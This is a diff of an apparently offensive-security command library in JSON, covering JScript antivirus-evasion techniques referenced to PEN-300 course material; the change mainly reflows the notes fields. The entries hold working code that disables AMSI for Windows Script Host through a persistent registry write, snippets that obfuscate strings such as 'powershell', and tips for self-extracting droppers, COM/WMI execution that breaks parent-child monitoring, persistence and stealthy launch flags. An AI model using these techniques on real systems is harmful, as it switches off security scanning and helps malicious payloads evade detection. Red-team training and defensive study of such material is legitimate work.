@@ -19,7 +19,7 @@
       ],
       "command": "var sh = new ActiveXObject(\"WScript.Shell\");\nvar key = \"HKCU\\\\Software\\\\Microsoft\\\\Windows Script\\\\Settings\\\\AmsiEnable\";\ntry {\n    var val = sh.RegRead(key);\n    if(val != 0) {\n        sh.RegWrite(key, 0, \"REG_DWORD\");\n    }\n} catch(e) {\n    sh.RegWrite(key, 0, \"REG_DWORD\");\n}\nWScript.Echo(\"AMSI disabled for WSH\");",
       "variables": [],
-      "notes": "Syntax: Save as .js file, execute with wscript.exe or cscript.exe Useful for VBA -> JScript attack chains. Persistent (survives reboot) - good and bad. Remember to clean up. See also: amsi-jscript-registry in amsi-bypass module. Time estimate: 2 minutes References: docs/av-evasion/jscript-evasion.md#amsi-registry-bypass, amsi-bypass.json#amsi-jscript-registry, PEN-300 Chapter 7.6.2 Manual alternative: Execute JScript from non-AMSI context, use COM objects, or compile to .exe with JScript.NET",
+      "notes": "Syntax:\nSave as .js file, execute with wscript.exe or cscript.exe Useful for VBA -> JScript attack chains.\n\nPersistent (survives reboot) - good and bad.\n\nRemember to clean up.\n\nSee also:\namsi-jscript-registry in amsi-bypass module.\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/jscript-evasion.md#amsi-registry-bypass, amsi-bypass.json#amsi-jscript-registry, PEN-300 Chapter 7.6.2 Manual alternative:\nExecute JScript from non-AMSI context, use COM objects, or compile to .exe with JScript.NET",
       "success_indicators": [
         "Registry key set to 0. AMSI disabled for current user's WSH sessions. Persists across reboots."
       ],
@@ -58,7 +58,7 @@
           "required": true
         }
       ],
-      "notes": "Syntax: Create JScript dropper, append payload after marker, save as .js Creative evasion technique. Initial scan sees benign dropper. Payload extracted at runtime. Good for embedding PowerShell scripts or small executables. Test marker uniqueness. ~20 min to implement. Time estimate: 20 minutes References: docs/av-evasion/jscript-evasion.md#self-modifying, PEN-300 Chapter 7.6.3 Manual alternative: Use HTTP download instead of embedding, encrypted payload sections, or multi-stage loaders",
+      "notes": "Syntax:\nCreate JScript dropper, append payload after marker, save as .js Creative evasion technique.\n\nInitial scan sees benign dropper.\n\nPayload extracted at runtime.\n\nGood for embedding PowerShell scripts or small executables.\n\nTest marker uniqueness.\n\n~20 min to implement.\n\nTime estimate:\n20 minutes References:\ndocs/av-evasion/jscript-evasion.md#self-modifying, PEN-300 Chapter 7.6.3 Manual alternative:\nUse HTTP download instead of embedding, encrypted payload sections, or multi-stage loaders",
       "success_indicators": [
         "JScript reads itself, extracts embedded payload, writes to temp, executes. Initial AMSI scan only sees dropper code."
       ],
@@ -85,7 +85,7 @@
       ],
       "command": "// Method 1: String.fromCharCode()\nvar cmd = String.fromCharCode(112,111,119,101,114,115,104,101,108,108); // \"powershell\"\n\n// Method 2: String concatenation\nvar cmd = \"pow\" + \"er\" + \"shell.exe\";\n\n// Method 3: Array join\nvar parts = [\"pow\", \"er\", \"shell\"];\nvar cmd = parts.join(\"\") + \".exe\";\n\n// Method 4: Base64 decode (custom function)\nfunction b64decode(str) {\n    var b64 = \"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=\";\n    var decoded = \"\";\n    // Decode implementation...\n    return decoded;\n}\nvar cmd = b64decode(\"cG93ZXJzaGVsbC5leGU=\");",
       "variables": [],
-      "notes": "Syntax: Apply to suspicious strings in JScript code Quick win for JScript payloads. Always obfuscate 'powershell', 'cmd', 'http', 'eval'. Use random variable names. String.fromCharCode() most effective. ~10 min to apply. Time estimate: 10 minutes References: docs/av-evasion/jscript-evasion.md#obfuscation Manual alternative: Use eval() with encoded strings, external config files, or hex encoding",
+      "notes": "Syntax:\nApply to suspicious strings in JScript code Quick win for JScript payloads.\n\nAlways obfuscate 'powershell', 'cmd', 'http', 'eval'.\n\nUse random variable names.\n\nString.fromCharCode() most effective.\n\n~10 min to apply.\n\nTime estimate:\n10 minutes References:\ndocs/av-evasion/jscript-evasion.md#obfuscation Manual alternative:\nUse eval() with encoded strings, external config files, or hex encoding",
       "success_indicators": [
         "Obfuscated strings bypass simple pattern matching. Code executes normally."
       ],
@@ -124,7 +124,7 @@
           "required": false
         }
       ],
-      "notes": "Syntax: Replace <COMMAND> with payload command COM execution breaks simple parent-child monitoring. WMI method more reliable than Task Scheduler. Clean up tasks after execution. Good for persistence too. ~15 min to implement. Time estimate: 15 minutes References: docs/av-evasion/jscript-evasion.md#com-execution Manual alternative: Use WScript.Shell.Exec(), CreateObject(\"Shell.Application\").ShellExecute(), or MMC20.Application COM object",
+      "notes": "Syntax:\nReplace <COMMAND> with payload command COM execution breaks simple parent-child monitoring.\n\nWMI method more reliable than Task Scheduler.\n\nClean up tasks after execution.\n\nGood for persistence too.\n\n~15 min to implement.\n\nTime estimate:\n15 minutes References:\ndocs/av-evasion/jscript-evasion.md#com-execution Manual alternative:\nUse WScript.Shell.Exec(), CreateObject(\"Shell.Application\").ShellExecute(), or MMC20.Application COM object",
       "success_indicators": [
         "Command executes via COM interface. Breaks WScript.exe -> cmd.exe parent-child relationship monitored by AV."
       ],
@@ -158,7 +158,7 @@
           "required": true
         }
       ],
-      "notes": "Syntax: Execute from command line or within script WScript for GUI-less execution from shortcuts/scheduled tasks. CScript for command-line integration. Always use //B //Nologo for stealth. Test both modes - different behavioral signatures. Time estimate: 2 minutes References: docs/av-evasion/jscript-evasion.md#execution-modes Manual alternative: Use PowerShell Invoke-Expression, direct COM object instantiation, or mshta.exe for HTA execution",
+      "notes": "Syntax:\nExecute from command line or within script WScript for GUI-less execution from shortcuts/scheduled tasks.\n\nCScript for command-line integration.\n\nAlways use //B //Nologo for stealth.\n\nTest both modes - different behavioral signatures.\n\nTime estimate:\n2 minutes References:\ndocs/av-evasion/jscript-evasion.md#execution-modes Manual alternative:\nUse PowerShell Invoke-Expression, direct COM object instantiation, or mshta.exe for HTA execution",
       "success_indicators": [
         "Script executes via chosen engine. WScript: GUI mode, CScript: console mode."
       ],
